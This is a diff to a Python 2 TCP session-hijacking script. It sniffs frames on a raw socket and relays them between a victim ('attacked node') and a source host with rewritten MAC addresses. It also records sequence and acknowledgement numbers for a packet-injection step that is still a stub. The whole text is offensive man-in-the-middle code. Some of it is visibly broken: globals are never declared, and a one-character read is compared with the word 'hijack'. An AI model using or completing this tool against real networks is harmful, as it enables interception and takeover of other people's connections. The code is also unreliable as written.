@@ -12,9 +12,11 @@ from struct import *
 
 #globals
 g_debug=False
-g_atacking_interface = ''
 g_atacked_mac = ''
+g_hijack_flag = False
 
+g_actual_ack = 0
+g_actual_seq = 0
 # CONSTANTS 
 c_AllPorts = 65565
 c_macSize = 6
@@ -42,7 +44,7 @@ class HijackIPV4:
         #create an INET, STREAMing socket
         try:
             self.s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
-            self.s.bind((g_atacking_interface,0))
+            self.s.bind((Attacking_node.interface,0))
             #self.sendingSocker = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         except socket.error , msg:
             print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
@@ -53,19 +55,26 @@ class HijackIPV4:
 
         #self.packet string from tuple
         self.packet = self.packetFull[0]
-        self.eth_header = self.translateEthernet()
+        self.translateEthernet()
         self.translateIP()
         self.translateTCP()
         
 
-    def sendto(self):
-        p = self.eth_header + self.ip_header + self.packet[self.iph_length:self.iph_length+20] \
-        + self.packet[self.iph_length+20:len(self.packet)]
+    def generate_eth_header(self,src_mac,dst_mac):
+        return pack('!6s6sH', binascii.unhexlify(dst_mac),  binascii.unhexlify(src_mac), self.eth[2])
+
+    def generate_hijact_tcp_header(self):
+        g_hijack_flag = False
+        
+    def sendto(self, src_mac,dst_mac):
+        self.eth_header = self.generate_eth_header(src_mac,dst_mac)
+        p = self.eth_header + self.packet[14:len(self.packet)]#self.ip_header + self.packet[self.iph_length:self.iph_length+40] 
         self.s.send(p)
+
 
     def translateEthernet(self):
         ethernet_header = self.packet[0:14]
-        eth = unpack('!6s6sH' , ethernet_header)
+        self.eth = unpack('!6s6sH' , ethernet_header)
          
         
         self.dst_mac = toHex(ethernet_header[0:6].decode("latin1"))
@@ -80,11 +89,7 @@ class HijackIPV4:
         # nao seria o src_mac?
         #print sys.argv[3]
 
-        #print 'hex value:' + ':'.join(hex(ord(x))[2:] for x in sys.argv[3])
-        dst_mac = binascii.unhexlify(g_atacked_mac) # to raw binary sys.argv[3]#funcao q transforma agv[3] em hex
-        print self.dst_mac
-        
-        return pack('!6s6sH', dst_mac,  binascii.unhexlify(self.src_mac), eth[2])
+
         
     def translateIP(self):
         ## TRANSLATE RECEIVED IP ###
@@ -148,10 +153,6 @@ class HijackIPV4:
         self.doff_reserved = tcph[4]
         self.tcph_length = self.doff_reserved >> 4
 
-        debug_print ("%s" %('Source Port : ' + str(self.source_port) + ' Dest Port : ' + str(self.dest_port)\
-        + ' Sequence Number : ' + str(self.sequence) + ' Acknowledgement : '\
-        + str(self.acknowledgement) + ' TCP header length : ' + str(self.tcph_length))) 
-
         h_size = self.iph_length + self.tcph_length * 4
         data_size = len(self.packet) - h_size
 
@@ -167,8 +168,8 @@ class HijackIPV4:
         tcp_ack_seq = tcph[3]
         tcp_doff = tcph[4]    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
         #tcp flags
-        tcp_fin = 0
-        tcp_syn = 1
+        tcp_fin = 1
+        tcp_syn = 0
         tcp_rst = 0
         tcp_psh = 0
         tcp_ack = 0
@@ -186,11 +187,15 @@ class HijackIPV4:
 
 
         if self.d_addr == Atacked_node.ip:
-            print 'Resending to atacked node'
-            self.sendto()
+            debug_print('Resending to atacked node')
+            g_actual_seq = self.sequence
+            g_actual_ack = self.acknowledgement
+            self.sendto(Attacking_node.mac, Atacked_node.mac)
         elif self.d_addr == Src_node.ip:
-            print 'Resending to src node'
-            self.sendto()
+            debug_print('Resending to src node')
+            g_actual_seq = self.sequence
+            g_actual_ack = self.acknowledgement
+            self.sendto(Attacking_node.mac,Src_node.mac)
 
 #open config
 with open("config.yaml", 'r') as stream:
@@ -198,16 +203,17 @@ with open("config.yaml", 'r') as stream:
 
 if(data_loaded['mode'] == 'debug'):
     g_debug=True
-else:
-    g_debug=False
 
-g_atacking_interface = data_loaded['atacking_node']['interface']
 g_atacked_mac = data_loaded['dst_node']['mac']
 
+Attacking_node = node(data_loaded['atacking_node'], data_loaded['atacking_node']['ip'], data_loaded['atacking_node']['mac'], data_loaded['atacking_node']['interface'] )
 Atacked_node = node(data_loaded['dst_node']['name'], data_loaded['dst_node']['ip'], data_loaded['dst_node']['mac'])
 Src_node = node(data_loaded['src_node']['name'], data_loaded['src_node']['ip'], data_loaded['src_node']['mac'])
 hijack = HijackIPV4()
 # receive a self.packet
 while True:
+    c = sys.stdin.read(1)
+    if c == 'hijack':
+        g_hijack_flag = True
     hijack.receive()
 
